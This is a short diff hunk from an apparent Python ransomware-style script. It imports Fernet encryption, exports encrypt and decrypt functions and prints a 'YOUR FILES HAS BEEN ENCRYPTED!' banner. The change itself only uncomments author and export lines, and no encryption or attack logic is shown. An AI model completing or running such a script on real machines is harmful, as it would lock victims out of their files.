@@ -3,9 +3,9 @@
 import os
 from cryptography.fernet import Fernet
 
-# __author__ = ("Justine Dela Torre (Jasutin)")
+__author__ = ("Justine Dela Torre (Jasutin)")
 
-# __all__ = ['encrypt', 'decrypt']
+__all__ = ['encrypt', 'decrypt']
 
 print("\tYOUR FILES HAS BEEN ENCRYPTED!\n")
 
